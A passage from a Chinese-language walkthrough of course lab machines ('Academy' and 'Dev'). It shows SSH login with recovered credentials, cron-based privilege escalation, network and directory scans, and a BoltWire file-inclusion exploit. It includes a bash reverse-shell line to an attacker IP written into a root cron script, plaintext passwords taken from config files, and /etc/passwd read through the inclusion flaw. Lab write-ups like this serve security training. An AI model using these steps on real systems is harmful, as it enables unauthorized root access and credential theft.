Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:104:110::/nonexistent:/usr/sbin/nologin</span><br><span class="line">sshd:x:105:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">ftp:x:107:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin</span><br><span class="line">**grimmie:x:1000:1000:administrator,,,:/home/grimmie:/bin/bash**</span><br></pre></td></tr></table></figure>
<ul>
<li>DB帳戶是grimmie，該用戶是管理員身分</li>
<li>嘗試SSH登入，將帳密輸入</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# ssh grimmie@192.168.19.141                                                                               </span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.19.141 (192.168.19.141)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:eeNKTTakhvXyaWVPMDTB9+/4WEg6WKZwlUp0ATptgb0.</span></span><br><span class="line"><span class="string">This key is not known by any other names.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.19.141<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">grimmie@192.168.19.141&#x27;</span>s password: **My_V3ryS3cur3_P4ss**</span><br><span class="line">Linux academy 4.19.0-16-amd64 <span class="comment">#1 SMP Debian 4.19.181-1 (2021-03-19) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Sun May 30 03:21:39 2021 from 192.168.10.31</span><br><span class="line">grimmie@academy:~$</span><br><span class="line">grimmie@academy:~$ <span class="built_in">ls</span></span><br><span class="line">backup.sh</span><br><span class="line">grimmie@academy:~$ **<span class="built_in">cat</span> backup.sh**  <span class="comment">#periodic check 工作週期檢查，讓系統去執行一些固定時間要自動進行的例行性工作</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> /tmp/backup.zip</span><br><span class="line">zip -r /tmp/backup.zip /var/www/html/academy/includes</span><br><span class="line"><span class="built_in">chmod</span> 700 /tmp/backup.zip</span><br><span class="line"></span><br><span class="line">grimmie@academy:~$ **crontab -l** <span class="comment">#-l UserName	列出使用者的 crontab 檔案。</span></span><br><span class="line">no crontab <span class="keyword">for</span> grimmie  </span><br><span class="line">grimmie@academy:~$ **crontab -u root -l** <span class="comment">#列出使用者 Cron 工作的狀態。</span></span><br><span class="line">must be privileged to use -u <span class="comment">#目前沒sudo執行權限</span></span><br><span class="line">grimmie@academy:~$ **crontab -e** <span class="comment">#建立 crontab 並選擇預設編輯器</span></span><br><span class="line">no crontab <span class="keyword">for</span> grimmie - using an empty one</span><br><span class="line"></span><br><span class="line">Select an editor.  To change later, run <span class="string">&#x27;select-editor&#x27;</span>.</span><br><span class="line">  1. /bin/nano        &lt;---- easiest</span><br><span class="line">  2. /usr/bin/vim.tiny</span><br><span class="line"></span><br><span class="line">Choose 1-2 [1]: 2</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>  <img src="/img/privilege_Untitled_11.png" alt="Untitled"></p>
<ul>
<li>列出計時器，查看是否有腳本正在運行計時器</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grimmie@academy:~$ **systemctl list-timers** </span><br><span class="line">NEXT                         LEFT       LAST                         PASSED       UNIT                         ACTIVATES</span><br><span class="line">Thu 2024-02-15 15:39:00 EST  24min left Thu 2024-02-15 15:09:01 EST  5min ago     phpsessionclean.timer        phpsessionclean.service</span><br><span class="line">Fri 2024-02-16 00:00:00 EST  8h left    n/a                          n/a          logrotate.timer              logrotate.service</span><br><span class="line">Fri 2024-02-16 00:00:00 EST  8h left    n/a                          n/a          man-db.timer                 man-db.service</span><br><span class="line">Fri 2024-02-16 05:17:18 EST  14h left   n/a                          n/a          apt-daily.timer              apt-daily.service</span><br><span class="line">Fri 2024-02-16 06:58:25 EST  15h left   n/a                          n/a          apt-daily-upgrade.timer      apt-daily-upgrade.service</span><br><span class="line">Fri 2024-02-16 11:30:17 EST  20h left   Thu 2024-02-15 11:30:17 EST  3h 44min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service</span><br><span class="line"></span><br><span class="line">6 timers listed.</span><br><span class="line">Pass --all to see loaded but inactive timers, too.</span><br><span class="line"></span><br><span class="line">grimmie@academy:~$ ps <span class="comment">#前運行的進程</span></span><br><span class="line">  PID TTY          TIME CMD</span><br><span class="line">29894 pts/0    00:00:00 bash</span><br><span class="line">30189 pts/0    00:00:00 ps <span class="comment">#顯示當前運行的進程信息</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>驗證和確認腳本是<strong>在計時器上運行</strong>，使用PSPY <a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a></p>
</li>
<li><p>記得將這腳本放到遠程傳送的目錄下，也就是開啟了http.server的目錄位置</p>
<ul>
<li>testscript&#x2F;trans</li>
<li>下載腳本到grimmie的用戶下</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grimmie@academy:/tmp$ wget http://192.168.19.130/pspy64</span><br><span class="line">--2024-02-15 15:26:04--  http://192.168.19.130/pspy64</span><br><span class="line">Connecting to 192.168.19.130:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3104768 (3.0M) [application/octet-stream]</span><br><span class="line">Saving to: ‘pspy64’</span><br><span class="line"></span><br><span class="line">pspy64                               100%[===================================================================&gt;]   2.96M  --.-KB/s    <span class="keyword">in</span> 0.09s   </span><br><span class="line"></span><br><span class="line">2024-02-15 15:26:04 (31.5 MB/s) - ‘pspy64’ saved [3104768/3104768]</span><br></pre></td></tr></table></figure>
<ul>
<li>現在用工具確認backup.sh正在運行</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grimmie@academy:/tmp$ **./pspy64** </span><br><span class="line">pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d</span><br><span class="line"></span><br><span class="line">     ██▓███    ██████  ██▓███ ▓██   ██▓</span><br><span class="line">    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒</span><br><span class="line">    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░</span><br><span class="line">    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░</span><br><span class="line">    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░</span><br><span class="line">    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ </span><br><span class="line">    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ </span><br><span class="line">    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  </span><br><span class="line">                   ░           ░ ░     </span><br><span class="line">                               ░ ░     </span><br><span class="line"></span><br><span class="line">Config: Printing events (colored=<span class="literal">true</span>): processes=<span class="literal">true</span> | file-system-events=<span class="literal">false</span> ||| Scanning <span class="keyword">for</span> processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)</span><br><span class="line">Draining file system events due to startup...</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">2024/02/15 15:26:54 CMD: UID=1000  PID=30261  | ./pspy64 </span><br><span class="line">2024/02/15 15:26:54 CMD: UID=0     PID=29932  | </span><br><span class="line">2024/02/15 15:26:54 CMD: UID=1000  PID=29894  | -bash </span><br><span class="line">2024/02/15 15:26:54 CMD: UID=1000  PID=29893  | sshd: grimmie@pts/0  </span><br><span class="line">2024/02/15 15:26:54 CMD: UID=1000  PID=29885  | (sd-pam) </span><br><span class="line">.........</span><br><span class="line">2024/02/15 15:26:54 CMD: UID=0     PID=9      | </span><br><span class="line">2024/02/15 15:26:54 CMD: UID=0     PID=8      | </span><br><span class="line">2024/02/15 15:26:54 CMD: UID=0     PID=6      | </span><br><span class="line">2024/02/15 15:26:54 CMD: UID=0     PID=4      | </span><br><span class="line">2024/02/15 15:26:54 CMD: UID=0     PID=3      | </span><br><span class="line">2024/02/15 15:26:54 CMD: UID=0     PID=2      | </span><br><span class="line">2024/02/15 15:26:54 CMD: UID=0     PID=1      | /sbin/init </span><br><span class="line">2024/02/15 15:27:01 CMD: UID=0     PID=30268  | /usr/sbin/CRON -f </span><br><span class="line">2024/02/15 15:27:01 CMD: UID=0     PID=30269  | /usr/sbin/CRON -f </span><br><span class="line">**2024/02/15 15:27:01 CMD: UID=0     PID=30270  | /bin/sh -c /home/grimmie/backup.sh </span><br><span class="line">2024/02/15 15:27:01 CMD: UID=0     PID=30271  | /bin/bash /home/grimmie/backup.sh </span><br><span class="line">2024/02/15 15:27:01 CMD: UID=0     PID=30272  | /bin/bash /home/grimmie/backup.sh </span><br><span class="line">2024/02/15 15:27:01 CMD: UID=0     PID=30273  | /bin/bash /home/grimmie/backup.sh**</span><br></pre></td></tr></table></figure>
</li>
<li><p>進行提權，前面結果看到利用&#x2F;bin&#x2F;bash 去執行了 backup.sh，我們可以修改sh檔案進行利用</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></li>
<li>Bash</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.19.130/8081 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<ul>
<li><p>kali(attacker vm) → <code>nc -nlvp 8081</code></p>
</li>
<li><p>grimmie →</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nano backup.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#ctrl + k清除該行文字</span></span><br><span class="line"><span class="comment">#填入</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.19.130/8081 0&gt;&amp;1 <span class="comment">#提升權限到root</span></span><br></pre></td></tr></table></figure>
<p>  <img src="/img/privilege_Untitled_12.png" alt="Untitled"></p>
</li>
<li><p><a target="_blank" rel="noopener" href="http://等待排程執行到backup.sh/">等待排程執行到backup.sh</a>，就成功執行該提權指令</p>
</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **nc -nlvp 8081**</span><br><span class="line">listening on [any] 8081 ...</span><br><span class="line">connect to [192.168.19.130] from (UNKNOWN) [192.168.19.141] 49870</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (30439): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">root@academy:~# **<span class="built_in">whoami</span>**</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line"></span><br><span class="line">root@academy:~# <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">**flag.txt**</span><br><span class="line">root@academy:~# **<span class="built_in">cat</span> flag.txt**</span><br><span class="line">Congratz you rooted this box !</span><br><span class="line">Looks like this CMS isn<span class="string">&#x27;t so secure...</span></span><br><span class="line"><span class="string">I hope you enjoyed it.</span></span><br><span class="line"><span class="string">If you had any issue please let us know in the course discord.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Happy hacking !</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="Walkthrough-Dev"><a href="#Walkthrough-Dev" class="headerlink" title="Walkthrough - Dev"></a><strong>Walkthrough - Dev</strong></h3><ul>
<li>192.168.19.142</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **nmap -T4 -A -p- 192.168.19.142**</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-15 15:47 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.19.142</span><br><span class="line">Host is up (0.0013s latency).</span><br><span class="line">Not shown: 65526 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE  VERSION</span><br><span class="line">22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 bd:96:ec:08:2f:b1:ea:06:ca:<span class="built_in">fc</span>:46:8a:7e:8a:e3:55 (RSA)</span><br><span class="line">|   256 56:32:3b:9f:48:2d:e0:7e:1b:<span class="built_in">df</span>:20:f8:03:60:56:5e (ECDSA)</span><br><span class="line">|_  256 95:<span class="built_in">dd</span>:20:ee:6f:01:b6:e1:43:2e:3c:f4:38:03:5b:36 (ED25519)</span><br><span class="line">80/tcp    open  http     Apache httpd 2.4.38 ((Debian))</span><br><span class="line">**|_http-title: Bolt - Installation error</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)**</span><br><span class="line">111/tcp   open  rpcbind  2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100003  3           2049/udp   nfs</span><br><span class="line">|   100003  3           2049/udp6  nfs</span><br><span class="line">|   100003  3,4         2049/tcp   nfs</span><br><span class="line">|   100003  3,4         2049/tcp6  nfs</span><br><span class="line">|   100005  1,2,3      41323/tcp   mountd</span><br><span class="line">|   100005  1,2,3      49494/udp6  mountd</span><br><span class="line">|   100005  1,2,3      51274/udp   mountd</span><br><span class="line">|   100005  1,2,3      55743/tcp6  mountd</span><br><span class="line">|   100021  1,3,4      37638/udp   nlockmgr</span><br><span class="line">|   100021  1,3,4      43669/tcp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      43833/tcp   nlockmgr</span><br><span class="line">|   100021  1,3,4      60309/udp6  nlockmgr</span><br><span class="line">|   100227  3           2049/tcp   nfs_acl</span><br><span class="line">|   100227  3           2049/tcp6  nfs_acl</span><br><span class="line">|   100227  3           2049/udp   nfs_acl</span><br><span class="line">|_  100227  3           2049/udp6  nfs_acl</span><br><span class="line">2049/tcp  open  **nfs**      3-4 (RPC <span class="comment">#100003)</span></span><br><span class="line">8080/tcp  open  http     Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">| http-open-proxy: Potentially OPEN proxy.</span><br><span class="line">|_Methods supported:CONNECTION</span><br><span class="line">|_http-title: PHP 7.3.27-1~deb10u1 - phpinfo()</span><br><span class="line">36403/tcp open  mountd   1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">41323/tcp open  mountd   1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">43609/tcp open  mountd   1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">43833/tcp open  nlockmgr 1-4 (RPC <span class="comment">#100021)</span></span><br><span class="line">MAC Address: 00:0C:29:BE:3A:C6 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.8</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.28 ms 192.168.19.142</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 20.59 seconds</span><br></pre></td></tr></table></figure>

<p>開啟網頁查看</p>
<ul>
<li><p>目前有兩個網頁</p>
<ul>
<li>8080&#x2F;tcp  open  http     Apache httpd 2.4.38 ((Debian))</li>
<li>80&#x2F;tcp    open  http     Apache httpd 2.4.38 ((Debian))</li>
</ul>
<p>  <img src="/img/privilege_Untitled_13.png" alt="Untitled"></p>
<p>  <img src="/img/privilege_Untitled_14.png" alt="Untitled">
  </p>
</li>
<li><p>php 資訊頁面</p>
<ul>
<li>洩漏資訊</li>
<li>頁面設定</li>
<li>information disclosure</li>
<li>跟伺服器有關的訊息</li>
<li>錯誤配置可能導致能進行漏洞利用</li>
</ul>
</li>
<li><p>尋找可能存在的網頁目錄位置</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.19.142/FUZZ</span><br><span class="line"></span><br><span class="line"><span class="comment">#                       [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 2ms]</span></span><br><span class="line">                        [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 1ms]</span><br><span class="line"><span class="comment"># on atleast 2 different hosts [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 4ms]</span></span><br><span class="line">public                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 2ms]</span><br><span class="line"><span class="comment"># Priority ordered case sensative list, where entries were found  [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 218ms]</span></span><br><span class="line">src                     [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 1ms]</span><br><span class="line">app                     [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 1ms]</span><br><span class="line"><span class="comment">#                       [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 511ms]</span></span><br><span class="line">vendor                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 1ms]</span><br><span class="line">extensions              [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 1ms]</span><br><span class="line"><span class="comment"># This work is licensed under the Creative Commons  [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 818ms]</span></span><br><span class="line"><span class="comment"># Copyright 2007 James Fisher [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 824ms]</span></span><br><span class="line"><span class="comment"># Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 866ms]</span></span><br><span class="line"><span class="comment"># directory-list-2.3-medium.txt [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 880ms]</span></span><br><span class="line"><span class="comment"># license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 1146ms]</span></span><br><span class="line"><span class="comment">#                       [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 1153ms]</span></span><br><span class="line"><span class="comment"># Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 1178ms]</span></span><br><span class="line"><span class="comment"># or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 1406ms]</span></span><br><span class="line"><span class="comment">#                       [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 1710ms]</span></span><br><span class="line">                        [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 1866ms]</span><br><span class="line">server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 6ms]</span><br><span class="line">:: Progress: [220560/220560] :: Job [1/1] :: 796 req/sec :: Duration: [0:00:52] :: Errors: 0 ::**</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.19.142:8080/FUZZ</span><br><span class="line"></span><br><span class="line"><span class="comment"># on atleast 2 different hosts [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 18ms]</span></span><br><span class="line"><span class="comment"># This work is licensed under the Creative Commons  [Status: 200, Size: 94539, Words: 4684, Lines: 1159, Duration: 75ms]</span></span><br><span class="line"><span class="comment"># Copyright 2007 James Fisher [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 143ms]</span></span><br><span class="line"><span class="comment"># directory-list-2.3-medium.txt [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 180ms]</span></span><br><span class="line"><span class="comment"># license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 428ms]</span></span><br><span class="line">dev                     [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 3ms]</span><br><span class="line">                        [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 490ms]</span><br><span class="line"><span class="comment"># or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 671ms]</span></span><br><span class="line"><span class="comment">#                       [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 686ms]</span></span><br><span class="line"><span class="comment">#                       [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 704ms]</span></span><br><span class="line"><span class="comment"># Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 708ms]</span></span><br><span class="line"><span class="comment"># Priority ordered case sensative list, where entries were found  [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 699ms]</span></span><br><span class="line"><span class="comment">#                       [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 713ms]</span></span><br><span class="line"><span class="comment">#                       [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 712ms]</span></span><br><span class="line"><span class="comment"># Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 731ms]</span></span><br><span class="line">                        [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 11ms]</span><br><span class="line">server-status           [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 4ms]</span><br><span class="line">:: Progress: [220560/220560] :: Job [1/1] :: 6896 req/sec :: Duration: [0:00:51] :: Errors: 0 ::**</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><p>查看 80 port</p>
<ul>
<li>pubilc &gt; 404 not founud</li>
<li>src &gt; Site &gt;  CustomisationExtension.php &gt; nothing here</li>
</ul>
<p>  <img src="/img/privilege_Untitled_15.png" alt="Untitled"></p>
<p>  <img src="/img/privilege_Untitled_16.png" alt="Untitled"></p>
<ul>
<li>app &gt;<ul>
<li>cache &gt;<ul>
<li><p>config-cache.json</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;database&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;driver&quot;</span>: <span class="string">&quot;pdo_sqlite&quot;</span>,</span><br><span class="line">            <span class="string">&quot;host&quot;</span>: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">            <span class="string">&quot;slaves&quot;</span>: [],</span><br><span class="line">            <span class="string">&quot;dbname&quot;</span>: <span class="string">&quot;bolt&quot;</span>,</span><br><span class="line">            <span class="string">&quot;prefix&quot;</span>: <span class="string">&quot;bolt_&quot;</span>,</span><br><span class="line">            <span class="string">&quot;charset&quot;</span>: <span class="string">&quot;utf8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;collate&quot;</span>: <span class="string">&quot;utf8_unicode_ci&quot;</span>,</span><br><span class="line">            <span class="string">&quot;randomfunction&quot;</span>: <span class="string">&quot;RANDOM()&quot;</span>,</span><br><span class="line">            **<span class="string">&quot;databasename&quot;</span>: <span class="string">&quot;bolt&quot;</span>,</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;bolt&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;I_love_java&quot;</span>,</span><br><span class="line">            <span class="string">&quot;user&quot;</span>: <span class="string">&quot;bolt&quot;</span>,</span><br><span class="line">            <span class="string">&quot;wrapperClass&quot;</span>: <span class="string">&quot;Bolt\\Storage\\Database\\Connection&quot;</span>,</span><br><span class="line">            <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/var/www/html/app/database/bolt.db&quot;</span>**</span><br></pre></td></tr></table></figure>
</li>
<li><p>development&#x2F;</p>
</li>
<li><p>exception&#x2F;</p>
</li>
<li><p>profiler&#x2F;</p>
</li>
<li><p>trans&#x2F;</p>
</li>
</ul>
</li>
<li>config &gt;<ul>
<li><p>config.yml</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">database:</span><br><span class="line">driver: sqlite</span><br><span class="line">databasename: bolt</span><br><span class="line">username: bolt</span><br><span class="line">password: I_love_java</span><br></pre></td></tr></table></figure>
</li>
<li><p>contenttypes.yml</p>
</li>
<li><p>extensions&#x2F;</p>
</li>
<li><p>menu.yml</p>
</li>
<li><p>permissions.yml</p>
</li>
<li><p>routing.yml</p>
</li>
<li><p>taxonomy.yml</p>
</li>
</ul>
</li>
<li>database &gt;bolt.db</li>
<li>unt &gt; loaded on a very old version of PHP</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/img/privilege_Untitled_17.png" alt="Untitled"></p>
<ul>
<li><p>查看8080 port</p>
<ul>
<li><p>dev &gt; boltwire setup successfully</p>
<ul>
<li>register</li>
</ul>
<p>  <img src="/img/privilege_Untitled_18.png" alt="Untitled"></p>
<p>  <img src="/img/privilege_Untitled_19.png" alt="Untitled"></p>
<ul>
<li><p>查找BoltWire相關漏洞</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/48411">https://www.exploit-db.com/exploits/48411</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Cyber-Wo0dy/CVE-2023-46501">https://github.com/Cyber-Wo0dy/CVE-2023-46501</a></li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **searchsploit boltwire**</span><br><span class="line">--------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                                 |  Path</span><br><span class="line">--------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">BoltWire 3.4.16 - <span class="string">&#x27;index.php&#x27;</span> Multiple Cross-Site Scripting Vulnerabilities                                    | php/webapps/36552.txt</span><br><span class="line">BoltWire 6.03 - **Local File Inclusion**                                                                           | php/webapps/48411.txt</span><br><span class="line">--------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure>
<ul>
<li>Cross-Site Scripting Vulnerabilities 對於這次攻擊目標的危害不大</li>
<li>除非有人模仿用戶進入並實際瀏覽網站</li>
<li>目前沒有要進行攻擊用戶的行為</li>
<li>關注Local File Inclusion 並利用這個漏洞去訪問一些機敏文件</li>
<li>修改&#x2F;index.php後的路徑<ul>
<li>必須是註冊後且登入用戶才可利用</li>
</ul>
</li>
</ul>
<p>  <img src="/img/privilege_Untitled_20.png" alt="Untitled"></p>
<ul>
<li>成功利用漏洞，可以嘗試換成查看&#x2F;etc&#x2F;shadow，也許可以看到passwd hash，但該頁面再這邊沒有任何內容</li>
</ul>
<p>  <img src="/img/privilege_Untitled_21.png" alt="Untitled"></p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List 